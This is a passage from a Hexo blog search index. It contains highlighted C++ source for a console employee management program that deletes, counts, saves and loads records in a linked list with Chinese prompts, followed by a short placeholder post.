class="string">&#x27;5&#x27;</span>:current-&gt;e.<span class="built_in">modifysalary</span>(); <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			flag = <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">save</span>();</span><br><span class="line">	<span class="keyword">if</span> (flag == <span class="literal">false</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;未查找到该编号的员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	Linklist current_2 = head;</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入需要删除的员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; id;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getId</span>() == id)</span><br><span class="line">		&#123;</span><br><span class="line">			current_2-&gt;next = current-&gt;next;</span><br><span class="line">			current = <span class="literal">NULL</span>;</span><br><span class="line">			cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;\t\t\t\t删除成功！&quot;</span> &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">			flag = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		current_2 = current;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flag == <span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;记录为空！\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">static_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	<span class="type">int</span> allnum = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> mnum = <span class="number">0</span>, spnum = <span class="number">0</span>, smnum = <span class="number">0</span>, tenum = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> bnum = <span class="number">0</span>, gnum = <span class="number">0</span>;</span><br><span class="line">	Linklist current = head-&gt;next, current_2 = head-&gt;next;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                ****统计方式****               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、统计所有员工数量             ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、统计各类员工数量             ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                3、统计员工性别                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择统计的方式:&quot;</span>;</span><br><span class="line">	cin &gt;&gt; choose;</span><br><span class="line">	<span class="built_in">clear_buffer</span>();</span><br><span class="line">	<span class="keyword">if</span> (choose == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			allnum++;</span><br><span class="line">			current = current-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; allnum &lt;&lt; <span class="string">&quot;】员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;经理&quot;</span>) &#123; mnum++;current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;销售人员&quot;</span>) &#123; spnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;销售经理&quot;</span>) &#123; smnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">gettype</span>() == <span class="string">&quot;技术人员&quot;</span>) &#123; tenum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; mnum &lt;&lt; <span class="string">&quot;】经理！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; spnum &lt;&lt; <span class="string">&quot;】销售人员！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; smnum &lt;&lt; <span class="string">&quot;】销售经理！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; tenum &lt;&lt; <span class="string">&quot;】技术人员！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;男&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;M&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;m&quot;</span>) &#123; bnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">			<span class="keyword">if</span> (current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;女&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;F&quot;</span> || current-&gt;e.<span class="built_in">getgender</span>() == <span class="string">&quot;f&quot;</span>) &#123; gnum++; current = current-&gt;next; <span class="keyword">continue</span>; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; bnum &lt;&lt; <span class="string">&quot;】男员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t本公司共有:【&quot;</span> &lt;&lt; gnum &lt;&lt; <span class="string">&quot;】女员工！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (choose == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t无效的统计选择！&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	ofstream outfile;</span><br><span class="line">	outfile.<span class="built_in">open</span>(<span class="string">&quot;employee.txt&quot;</span>, ios::trunc | ios::out);</span><br><span class="line">	<span class="keyword">if</span> (!outfile) &#123; <span class="comment">//打开失败</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;error opening source file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">listlength</span>();i++ ) &#123;</span><br><span class="line">		outfile &lt;&lt; current-&gt;e.<span class="built_in">getId</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getname</span>() &lt;&lt; <span class="string">&quot; &quot;</span>&lt;&lt; current-&gt;e.<span class="built_in">getgender</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getdepartment</span>() &lt;&lt; <span class="string">&quot; &quot;</span>&lt;&lt; current-&gt;e.<span class="built_in">getlevel</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; current-&gt;e.<span class="built_in">getsalary</span>() &lt;&lt; endl;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	outfile.<span class="built_in">close</span>();<span class="comment">/*循环结束后，关闭输出文件流 outfile*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Linklist current = <span class="keyword">new</span> Node;</span><br><span class="line">	current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	Linklist H = current;</span><br><span class="line">	Linklist p = H;</span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	<span class="type">int</span> Id=<span class="literal">NULL</span>;</span><br><span class="line">	string Name;</span><br><span class="line">	string Gender;</span><br><span class="line">	string Department;</span><br><span class="line">	string Level;</span><br><span class="line">	<span class="type">double</span> salary;</span><br><span class="line">	<span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">&quot;employee.txt&quot;</span>,ios::in )</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!infile) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;error opening source file.&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(infile &gt;&gt; Id&gt;&gt;Name &gt;&gt; Gender &gt;&gt; Department &gt;&gt; Level &gt;&gt; salary) </span><br><span class="line">	&#123;</span><br><span class="line">		flag =<span class="literal">false</span>;</span><br><span class="line">		current-&gt;e.<span class="built_in">saveid</span>(Id);</span><br><span class="line">		current-&gt;e.<span class="built_in">savename</span>(Name);</span><br><span class="line">		current-&gt;e.<span class="built_in">savegender</span>(Gender);</span><br><span class="line">		current-&gt;e.<span class="built_in">savedepartment</span>(Department);</span><br><span class="line">		current-&gt;e.<span class="built_in">savelevel</span>(Level);</span><br><span class="line">		current-&gt;e.<span class="built_in">savesalary</span>(salary);</span><br><span class="line">		p-&gt;next = current;</span><br><span class="line">		p = current;</span><br><span class="line">		Linklist newNode = <span class="keyword">new</span> Node;</span><br><span class="line">		newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		current-&gt;next = newNode;</span><br><span class="line">		current = newNode;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span> current;</span><br><span class="line">	p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (flag)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;文件为空！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	infile.<span class="built_in">close</span>();</span><br><span class="line">	head-&gt;next = H;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有误存储</span></span><br><span class="line"><span class="comment">//void save()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	ofstream f(&quot;employee.dat&quot;, ios::trunc | ios::out | ios::binary);</span></span><br><span class="line"><span class="comment">//	Linklist current = head-&gt;next;</span></span><br><span class="line"><span class="comment">//	if (!f)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cerr &lt;&lt; &quot;open error!&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		abort();</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	while (current != NULL)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		f.write(reinterpret_cast&lt;char*&gt;(&amp;current-&gt;e), sizeof(current-&gt;e));</span></span><br><span class="line"><span class="comment">//		current = current-&gt;next;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	f.close();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//void load()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	ifstream f(&quot;employee.dat&quot;, ios::in | ios::binary);</span></span><br><span class="line"><span class="comment">//	if (!f)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cerr &lt;&lt; &quot;open error!&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		abort();</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	Linklist current = new Node;</span></span><br><span class="line"><span class="comment">//	current-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//	Linklist H = current;</span></span><br><span class="line"><span class="comment">//	Linklist p = H;</span></span><br><span class="line"><span class="comment">//	bool flag = true;</span></span><br><span class="line"><span class="comment">//	while (f.read(reinterpret_cast&lt;char*&gt;(&amp;current-&gt;e), sizeof(current-&gt;e))) &#123;</span></span><br><span class="line"><span class="comment">//		flag = false;</span></span><br><span class="line"><span class="comment">//		p-&gt;next = current;</span></span><br><span class="line"><span class="comment">//		p = current;</span></span><br><span class="line"><span class="comment">//		Linklist newNode = new Node;</span></span><br><span class="line"><span class="comment">//		newNode-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//		current-&gt;next = newNode;</span></span><br><span class="line"><span class="comment">//		current = newNode;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	delete current;</span></span><br><span class="line"><span class="comment">//	p-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">//	if (flag)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; &quot;文件为空！&quot;;</span></span><br><span class="line"><span class="comment">//		exit(0);</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//	f.close();</span></span><br><span class="line"><span class="comment">//	head-&gt;next = H;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>敬请T期待</title>
    <url>/2024/01/16/%E6%95%AC%E8%AF%B7T%E6%9C%9F%E5%BE%85/</url>
    <content><![CDATA[<h1 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h1><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO!"></a>HELLO!</h2><blockquote>
<p>敬请T期待</p>
</blockquote>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Begin</tag>
      </tags>
  </entry>
</search>
